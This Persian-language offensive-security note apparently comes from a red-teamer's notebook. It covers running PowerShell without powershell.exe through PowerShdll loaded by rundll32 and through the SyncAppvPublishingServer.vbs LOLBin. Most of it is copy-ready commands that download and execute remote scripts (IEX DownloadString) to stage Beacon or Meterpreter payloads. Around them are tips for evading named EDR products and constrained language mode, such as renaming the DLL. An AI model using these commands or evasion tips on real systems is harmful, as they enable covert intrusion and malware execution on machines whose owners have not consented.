

یک DLL خالص (بدون هیچ dependency خارجی) که تمام Runspace و System.Management.Automation رو داخل خودش دارد. با rundll32 اجرا می‌شه و یک PowerShell interactive یا one-liner می‌ده.مسیرهای قانونی که همیشه روی ویندوز ۱۰/۱۱ و سرور ۲۰۱۶–۲۰۲۵ وجود دارن:

```shell

rundll32.exe C:\temp\PowerShdll.dll,main


rundll32.exe C:\temp\PowerShdll.dll,main -c "IEX((New-Object Net.WebClient).DownloadString('http://10.0.0.5/beacon.ps1'))"


rundll32.exe url.dll,FileProtocolHandler "data:application/octet-stream;base64,TVqQAAMAAAAEAAAA//8AALgA...[base64-of-PowerShdll]...=="
```


![[image 1.gif]]



چرا هنوز کار می‌کنه؟

- rundll32.exe همیشه whitelisted هست
- هیچ powershell.exe spawn نمی‌شه
- تمام چیزها داخل rundll32 process می‌مونه
- اکثر EDRها هنوز به این DLL خاص rule ندارند (به‌خصوص اگر rename کنی به چیزی مثل version.dll)

۲. SyncAppvPublishingServer.exe + SyncAppvPublishingServer.vbs (by Matt Nelson – ۲۰۱۸، هنوز ۱۰۰٪ کار می‌کنه)

روش اصلی (دقیقاً همان چیزی که Matt Nelson منتشر کرد):

```shell
# اجرای یک خط PowerShell
"Break; calc.exe" > C:\Windows\Temp\evil.txt
SyncAppvPublishingServer.vbs "Break; calc.exe"

# دانلود و اجرای ریموت اسکریپت
SyncAppvPublishingServer.vbs "Break; IEX((New-Object Net.WebClient).DownloadString('http://10.0.0.5/ps.txt'))"

# اجرای Beacon یا Meterpreter stage
SyncAppvPublishingServer.vbs "Break; IEX((New-Object Net.WebClient).DownloadString('https://bit.ly/3abc123'))"
```

![[image 1 1.png]]



چرا این روش هنوز طلاییه؟

- هر دو فایل Microsoft-signed هستن
- Parent process = wscript.exe (whitelisted)
- هیچ powershell.exe اجرا نمی‌شه
- حتی اگر PowerShell constrained language mode فعال باشه، اینجا اعمال نمی‌شه
- Elastic, CrowdStrike, Defender ATP, Carbon Black تا نوامبر ۲۰۲۵ هنوز به این LOLBin خاص rule عمومی ندارند (فقط بعضی مشتری‌ها custom rule دارن)

```shell
# PowerShdll fileless
rundll32.exe url.dll,FileProtocolHandler "https://raw.githubusercontent.com/peterstraat/PowerShdll/master/dist/PowerShdll.dll"

# SyncAppvPublishingServer (بهترین برای محیط‌های واقعی)
C:\Windows\System32\SyncAppvPublishingServer.vbs "Break; IEX((New-Object Net.WebClient).DownloadString('https://yourserver/payload.ps1'))"
```


==link Youtube== --->[# Unmanaged PowerShell - PowerShell without powershell.exe](https://youtu.be/7tvfb9poTKg)


==link Script== ---> [powershell](github.com/p3nt4/PowerShdll)

